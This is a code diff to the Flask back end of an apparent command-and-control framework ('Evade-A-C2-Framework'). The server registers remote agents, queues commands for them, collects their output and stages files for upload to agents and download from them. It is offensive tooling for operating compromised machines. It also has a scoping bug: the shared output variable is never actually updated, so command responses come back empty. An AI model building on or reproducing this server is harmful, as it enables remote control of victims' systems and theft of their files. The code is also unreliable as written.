@@ -2,16 +2,17 @@ import os
 from flask import Flask, render_template, request, jsonify, send_from_directory
 from flask_socketio import SocketIO
 from werkzeug.utils import secure_filename
-from ...database import Session, Agent
+from database import Session, Agent
 import requests
+import time
 
 app = Flask(__name__)
 socketio = SocketIO(app)
 
 # Define separate directories for uploads and downloads
-BASE_DIR = 'E:\\Github\\Repos\\Evade-A-C2-Framework\\test\\HTTPS_COMPLETE'
-UPLOADS_FOLDER = os.path.join(BASE_DIR, 'uploads_to_agents')
-DOWNLOADS_FOLDER = os.path.join(BASE_DIR, 'downloads_from_agents')
+BASE_DIR = r'E:\Github\Repos\Evade-A-C2-Framework\COMPELTE\back-end\payload'
+UPLOADS_FOLDER = os.path.join(BASE_DIR, 'uploads_to_http_agents')
+DOWNLOADS_FOLDER = os.path.join(BASE_DIR, 'downloads_from_http_agents')
 
 app.config['UPLOADS_FOLDER'] = UPLOADS_FOLDER
 app.config['DOWNLOADS_FOLDER'] = DOWNLOADS_FOLDER
@@ -41,17 +42,6 @@ def notify_flask_about_agent_connection(agent_id, agent_name,addr):
 
 @app.route('/register', methods=['POST'])
 def register_agent():
-    agent_id = request.form.get('agent_id')
-    if agent_id:
-        agents[agent_id] = {'command': '', 'files': []}
-        socketio.emit('agent_registered', {'agent': agent_id})
-        return jsonify({'message': 'Agent registered successfully'}), 200
-    else:
-        return jsonify({'error': 'Agent registration failed: Missing agent_id'}), 400
-
-'''
-@app.route('/register', methods=['POST'])
-def register_agent():
     addr = request.remote_addr
     agent_id = request.form.get('agent_id')
 
@@ -77,14 +67,32 @@ def register_agent():
 
     # Fallback return, in case none of the above conditions are met
     return jsonify({'error': 'Unexpected error occurred'}), 500
-'''
+
+current_output=None
+
 @app.route('/send_command', methods=['POST'])
 def send_command():
-    agent_id = request.form.get('agent_id')
-    command = request.form.get('command')
+    # Print existing agents for debugging
+    print("Current agents:", agents)
+
+    # Accessing data from the POST request
+    if request.is_json:
+        data = request.get_json()
+        agent_id = data.get('agentId')
+        command = data.get('command')
+    else:
+        agent_id = request.form.get('agentId')
+        command = request.form.get('command')
+
+    # Debugging print to see what data is received
+    print("Received data:", data if request.is_json else request.form)
+
+    # Processing the command if the agent is found
     if agent_id in agents:
         agents[agent_id]['command'] = command
-        return jsonify({'message': 'Command sent successfully'}), 200
+        print(f"Command set for agent {agent_id}: {command}")  # More specific print statement
+        time.sleep(1)
+        return jsonify({'message': 'Command sent successfully','response':current_output}), 200
     else:
         return jsonify({'error': 'Agent not found'}), 404
 
@@ -119,8 +127,10 @@ def send_output():
             return jsonify({'error': str(e)}), 500
     else:
         output = request.form.get('output')
+        current_output=output
         if not output:
             return jsonify({'error': 'Missing output data'}), 400
+        print(output)
         socketio.emit('output_received', {'output': output, 'agent_id': agent_id})
         return jsonify({'message': 'Output received successfully'}), 200
 
